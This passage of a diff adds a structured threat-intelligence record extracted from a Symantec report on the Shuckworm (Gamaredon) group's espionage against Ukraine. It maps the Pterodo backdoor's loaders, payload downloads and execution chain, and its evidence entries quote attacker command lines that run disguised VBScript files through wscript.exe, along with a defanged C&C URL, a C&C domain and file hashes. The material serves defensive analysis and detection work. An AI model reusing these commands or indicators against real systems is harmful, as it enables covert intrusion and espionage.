+    },
+    {
+      "id": "ent_victim_Ukraine",
+      "type": "Victim",
+      "name": "Ukraine",
+      "normalized_name": "Ukraine",
+      "aliases": [],
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_1",
+        "ev_2",
+        "ev_4"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_1",
+      "supporting_evidence_ids": [
+        "ev_4",
+        "ev_2"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "alias_of",
+      "head_id": "ent_malware_backdoor_leveraged_by_Shuckworm",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "Malware",
+      "tail_type": "Malware",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_13",
+        "ev_17"
+      ],
+      "primary_evidence_id": "ev_13",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_Pterodo",
+      "tail_id": "ent_file_backed.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_30",
+        "ev_76"
+      ],
+      "primary_evidence_id": "ev_30",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_Pterodo",
+      "tail_id": "ent_file_deep-green.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_83"
+      ],
+      "primary_evidence_id": "ev_83",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_Pterodo",
+      "tail_id": "ent_file_depended.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_45"
+      ],
+      "primary_evidence_id": "ev_45",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0005",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "executes",
+      "head_id": "ent_file_baby.dat",
+      "tail_id": "ent_file_baby.cmd",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_29",
+        "ev_75"
+      ],
+      "primary_evidence_id": "ev_29",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0006",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "executes",
+      "head_id": "ent_file_mshta.exe",
+      "tail_id": "ent_file_depended.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_10",
+        "ev_50"
+      ],
+      "primary_evidence_id": "ev_10",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0007",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "executes",
+      "head_id": "ent_file_planeta.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_58"
+      ],
+      "primary_evidence_id": "ev_58",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0008",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_baby.dat",
+      "tail_id": "ent_file_baby.cmd",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_29",
+        "ev_75"
+      ],
+      "primary_evidence_id": "ev_29",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0009",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_baby.dat",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_29",
+        "ev_75"
+      ],
+      "primary_evidence_id": "ev_29",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0010",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_deep-sunken.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_27",
+        "ev_69"
+      ],
+      "primary_evidence_id": "ev_27",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0011",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_deerskin.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_62"
+      ],
+      "primary_evidence_id": "ev_62",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0012",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_defiant.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_81"
+      ],
+      "primary_evidence_id": "ev_81",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0013",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_depended.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_7",
+        "ev_45",
+        "ev_46"
+      ],
+      "primary_evidence_id": "ev_7",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0014",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_mshta.exe",
+      "tail_id": "ent_file_depended.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_10",
+        "ev_50"
+      ],
+      "primary_evidence_id": "ev_10",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0015",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_mshta.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_12",
+        "ev_50"
+      ],
+      "primary_evidence_id": "ev_12",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0016",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "loads",
+      "head_id": "ent_file_planeta.exe",
+      "tail_id": "ent_malware_Pterodo",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_58"
+      ],
+      "primary_evidence_id": "ev_58",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0017",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "retrieves_config",
+      "head_id": "ent_malware_Pterodo",
+      "tail_id": "ent_file_deep-versed.nls",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.87,
+      "evidence_ids": [
+        "ev_83"
+      ],
+      "primary_evidence_id": "ev_83",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "retrieves_config",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "config_retrieve",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0018",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "type": "writes_output",
+      "head_id": "ent_malware_Pterodo",
+      "tail_id": "ent_file_deep-versed.nls",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_83"
+      ],
+      "primary_evidence_id": "ev_83",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "writes_output",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "collection",
+        "notes": "write_output",
+        "schema_version": "v5.0-event-frame"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "delivery",
+      "relation_id": "rel_0002",
+      "type": "downloads_payload",
+      "summary": "Pterodo downloads_payload backed.exe",
+      "evidence_ids": [
+        "ev_30",
+        "ev_76"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "delivery",
+      "relation_id": "rel_0003",
+      "type": "downloads_payload",
+      "summary": "Pterodo downloads_payload deep-green.exe",
+      "evidence_ids": [
+        "ev_83"
+      ]
+    },
+    {
+      "step_id": "step_003",
+      "stage": "delivery",
+      "relation_id": "rel_0004",
+      "type": "downloads_payload",
+      "summary": "Pterodo downloads_payload depended.exe",
+      "evidence_ids": [
+        "ev_45"
+      ]
+    },
+    {
+      "step_id": "step_004",
+      "stage": "delivery",
+      "relation_id": "rel_0017",
+      "type": "retrieves_config",
+      "summary": "Pterodo retrieves_config deep-versed.nls",
+      "evidence_ids": [
+        "ev_83"
+      ]
+    },
+    {
+      "step_id": "step_005",
+      "stage": "execution",
+      "relation_id": "rel_0005",
+      "type": "executes",
+      "summary": "baby.dat executes baby.cmd",
+      "evidence_ids": [
+        "ev_29",
+        "ev_75"
+      ]
+    },
+    {
+      "step_id": "step_006",
+      "stage": "execution",
+      "relation_id": "rel_0006",
+      "type": "executes",
+      "summary": "mshta.exe executes depended.exe",
+      "evidence_ids": [
+        "ev_10",
+        "ev_50"
+      ]
+    },
+    {
+      "step_id": "step_007",
+      "stage": "execution",
+      "relation_id": "rel_0007",
+      "type": "executes",
+      "summary": "planeta.exe executes Pterodo",
+      "evidence_ids": [
+        "ev_58"
+      ]
+    },
+    {
+      "step_id": "step_008",
+      "stage": "execution",
+      "relation_id": "rel_0008",
+      "type": "loads",
+      "summary": "baby.dat loads baby.cmd",
+      "evidence_ids": [
+        "ev_29",
+        "ev_75"
+      ]
+    },
+    {
+      "step_id": "step_009",
+      "stage": "execution",
+      "relation_id": "rel_0009",
+      "type": "loads",
+      "summary": "baby.dat loads Pterodo",
+      "evidence_ids": [
+        "ev_29",
+        "ev_75"
+      ]
+    },
+    {
+      "step_id": "step_010",
+      "stage": "execution",
+      "relation_id": "rel_0010",
+      "type": "loads",
+      "summary": "deep-sunken.exe loads Pterodo",
+      "evidence_ids": [
+        "ev_27",
+        "ev_69"
+      ]
+    },
+    {
+      "step_id": "step_011",
+      "stage": "execution",
+      "relation_id": "rel_0011",
+      "type": "loads",
+      "summary": "deerskin.exe loads Pterodo",
+      "evidence_ids": [
+        "ev_62"
+      ]
+    },
+    {
+      "step_id": "step_012",
+      "stage": "execution",
+      "relation_id": "rel_0012",
+      "type": "loads",
+      "summary": "defiant.exe loads Pterodo",
+      "evidence_ids": [
+        "ev_81"
+      ]
+    },
+    {
+      "step_id": "step_013",
+      "stage": "execution",
+      "relation_id": "rel_0013",
+      "type": "loads",
+      "summary": "depended.exe loads Pterodo",
+      "evidence_ids": [
+        "ev_7",
+        "ev_45",
+        "ev_46"
+      ]
+    },
+    {
+      "step_id": "step_014",
+      "stage": "execution",
+      "relation_id": "rel_0014",
+      "type": "loads",
+      "summary": "mshta.exe loads depended.exe",
+      "evidence_ids": [
+        "ev_10",
+        "ev_50"
+      ]
+    },
+    {
+      "step_id": "step_015",
+      "stage": "execution",
+      "relation_id": "rel_0015",
+      "type": "loads",
+      "summary": "mshta.exe loads Pterodo",
+      "evidence_ids": [
+        "ev_12",
+        "ev_50"
+      ]
+    },
+    {
+      "step_id": "step_016",
+      "stage": "execution",
+      "relation_id": "rel_0016",
+      "type": "loads",
+      "summary": "planeta.exe loads Pterodo",
+      "evidence_ids": [
+        "ev_58"
+      ]
+    },
+    {
+      "step_id": "step_017",
+      "stage": "collection",
+      "relation_id": "rel_0018",
+      "type": "writes_output",
+      "summary": "Pterodo writes_output deep-versed.nls",
+      "evidence_ids": [
+        "ev_83"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_1",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s1"
+      },
+      "text": "symantec-enterprise-blogs.security.com /blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine The Russia-linked Shuckworm group (aka Gamaredon, Armageddon) is continuing to conduct cyber-espionage attacks against targets in Ukraine.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_2",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s2"
+      },
+      "text": "Active since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly against entities in Ukraine.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_3",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s3"
+      },
+      "text": "The group is known to use phishing emails to distribute either freely available remote access tools, including Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "A recent report published by The Security Service of Ukraine (SSU) noted that Shuckworm’s attacks have grown in sophistication in recent times, with attackers now using living-off-the-land tools to steal credentials and move laterally on victim networks.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_6",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s6"
+      },
+      "text": "This file is a known custom backdoor leveraged by Shuckworm (aka Pterodo).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_7",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s7"
+      },
+      "text": "Two additional VBS scripts are observed being executed via depended.exe:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_10",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s3"
+      },
+      "text": "Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_12",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s5"
+      },
+      "text": "Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_13",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s6"
+      },
+      "text": "At the same time, a new variant of Pterodo is installed via depended.exe.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_15",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s8"
+      },
+      "text": "Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_17",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s1"
+      },
+      "text": "Once the connection is confirmed to be active, the attackers proceed to download another variant of their Pterodo backdoor and begin using the new C&C to download additional scripts and tools, as well as creating scheduled tasks to run every few minutes.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_18",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s2"
+      },
+      "text": "July 16 The attackers are then observed executing commands via planeta.exe:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_27",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s1"
+      },
+      "text": "If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_29",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s3"
+      },
+      "text": "The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_30",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s4"
+      },
+      "text": "The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_31",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s5"
+      },
+      "text": "The downloaded payload (backed.exe) could not be retrieved.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_32",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s6"
+      },
+      "text": "However, the following files were also obtained during our investigation: z4z05jn4.egf.exe defiant.exe",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_33",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s1"
+      },
+      "text": "%PUBLIC%\\Downloads deep-green.exe UltraVNC is an open-source remote-administration/remote-desktop-software utility.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_34",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s2"
+      },
+      "text": "deep-green.exe A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_35",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s1"
+      },
+      "text": "The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_39",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 8,
+        "section": "body",
+        "sentence_id": "p8_s2"
+      },
+      "text": "Examples include: deceive.exe deceived.exe deception.exe deceptive.exe decide.exe decided.exe decipher.exe decisive.exe deep-sunken.exe deep-vaulted.exe Detected command lines are simple and consist of just the binary path + name; no switches, etc.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_44",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r2"
+      },
+      "text": "wscript.exe CSIDL_PROFILE\\searches\\depended.lnk //e:VBScript //b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_45",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r3"
+      },
+      "text": "The backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe (94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from hxxp://92.242.62.131/wordpress.php?is=[REDACTED].",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_46",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r4"
+      },
+      "text": "Two additional VBS scripts are observed being executed via depended.exe:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_47",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r5"
+      },
+      "text": "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\roaming\\reflect.rar //e:VBScript //b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_48",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r1"
+      },
+      "text": "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\deep- thoughted. //e:VBScript //b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_49",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r2"
+      },
